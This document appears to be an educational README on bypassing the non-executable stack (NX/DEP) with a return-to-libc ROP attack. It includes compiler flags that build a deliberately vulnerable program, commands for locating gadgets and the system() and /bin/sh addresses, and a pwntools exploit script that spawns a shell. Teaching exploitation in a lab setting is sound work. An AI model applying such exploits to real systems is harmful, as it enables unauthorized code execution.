# Bypassing Non-eXecutable stack

NX bit is a mitigation technique used to increase the `difficulty` of running arbitrary code in case of an exploitation of a memory corruption `vulnerability` such as a buffer overflow.

The goal of NX bit is to separate between memory regions containing code to those containing data. That is due to the `“Von Neumann Architecture”`, in which the same memory address space can store both code and data.

Different CPU architectures and operating systems can call this feature in different names. Let us look at a couple of examples. In AMD based CPUs it is called `“NX bit”`, on Intel CPUs **“XD bit”** (Execute Disabled) and on ARM CPUs **“XN bit”** (Execute Never). On the operating system front on Windows, it is called `DEP (Data Execution Prevention)` and on Linux it is called `W^X (Write XOR Execute)`.

With NX bit turned on, our classic approach to stack based buffer overflow will fail to exploit the vulnerability. Since in classic approach, `shellcode was copied into the stack` and return address was pointing to shellcode. But now since stack is no more executable, our exploit fails!! But this mitigation technique is not completely foolproof, hence in this post lets see how to `bypass` NX Bit!!

- By `default` when compiling C program NX bit is enabled.
- To disable it use command

``````bash
gcc -z execstack program.c 
```````

### Return to Libc attack (Bypass NX)

---

The particular attack makes use of code which exists in the always-present C library (libc). For the sake of simplicity, assuming that we already have control over the `RIP register`, then instead of redirecting the control to some memory location in the stack, we will force a call to a carefully chosen existing function which serves our needs as an attacker **(e.g. to spawn a shell)**.

`libc` is a very popular target for these type of attacks as it contains almost every C function while all of these function can be accessed as they are exported. One of these functions is the system(), which has the following syntax:

```C
int system(const char *command)
```

- Find the `system()` function address
- Pass `arguments` to this function
- Find the `exit()` function address, to close the program cleanly.

In the C calling conversion in `64 bit architecture` up to six arguments will be placed to the `RDI, RSI, RDX, RCX, R8 and R9` registers and anything additional will be placed in to the stack.

After the returning from the greet_me function the stack must look like bellow:

---

![Stack](https://miro.medium.com/v2/resize:fit:640/format:webp/1*jo-61Wu9G11Xht7l7PGPJg.png)


1. Place adequate data to overflow the buffer and overwrite the `$rbp` register

2. Overwrite the `RIP` register in order to point to a `POP RDI` instruction followed by a `RET`, this way what ever is on top of the stack (in our case it will be the `“/bin/sh”` string) will be passed to the RDI register and the RET will pop the stack placing the next instruction address to the RIP register→3.

3. The stack contains the `address` of the system() function which will be passed to the RIP (due to the RET from the previous step).

4. When the system() function returns, the RIP register will point to the exit() function, in order to exit our program cleanly.

### Vulnerable Program 

---

To make a program vulnerable with only NX bit enabled use the following arguments when compiling program.

```bash
gcc -fno-stack-protector -no-pie -D_FORTIFY_SOURCE=0 program.c -o program
```

<br>

#### Locate the libc library file

Use following command in gdb to locate `libc` loaded address in the program.

```bash
$gdb-peda vmmap
```

```bash
ldd programexecutable
```

```bash
$gdb-peda info proc map
```

#### Locate a the gadget (in libc)

To get the pop rdi instruction we can use many tools to get the gadgets from the libc

```bash
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi"
```

- You can get /bin/sh address using the following commands. The address given by the command will be relative address to libc_base address.Use `(libc_base+/bin/sh)` to get the proper /bin/sh address.

```bash
strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep '/bin/sh'
```

- You can find system function in `gdb` also or in using `readelf`

```bash
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
```

```bash
$gdb-peda x system
```

### Final Exploit

```python
import struct
from pwn import *
libc_base = 0x00007ffff7c00000
padding  = b"A"*24
#ret      = struct.pack("<Q", libc_base+0x40101a)   # stack alignment
ret      = p64(libc_base+0x40101a)                  
#poprdi   = struct.pack("<Q", libc_base+0x28715)    # pop rdi
poprdi   = p64(libc_base+0x28715)
#binsh    = struct.pack("<Q", libc_base+0x1c041b)   # /bin/sh
binsh    = p64(libc_base+0x1c041b)
#system   = struct.pack("<Q", 0x7ffff7c55230)       # absolute system address
system   = p64(0x7ffff7c55230)
#exitfunc = struct.pack("<Q", 0x7ffff7c45240)       # exit function absolute address
exitfunc = p64(0x7ffff7c45240) 
exploit = padding+ret+poprdi+binsh+system+exitfunc
file = open('exp', 'wb')
file.write(exploit)
```

## Additional Links

- [GDB](https://github.com/meharehsaan/intelx86_64/tree/master/gdb)
- [Funcions in assembly](https://github.com/meharehsaan/intelx86_64/blob/master/functions/README.md)
- [Calling conventions 64bit](https://github.com/meharehsaan/intelx86_64/tree/master/funcallconvention)
- [Simple BufferOverflow](https://github.com/meharehsaan/bufferoverflow/tree/master/bufferoverflow/bufferoverflow/README.md)
- [Introduction to x64 Linux Binary Exploitation (Part 2)—return into libc](https://valsamaras.medium.com/introduction-to-x64-binary-exploitation-part-2-return-into-libc-c325017f465)
- [x64 Linux Binary Exploitation Training](https://www.youtube.com/watch?v=gxU3e7GbC-M)

---

Best Regards - [Mehar Ehsaan](https://github.com/meharehsaan)
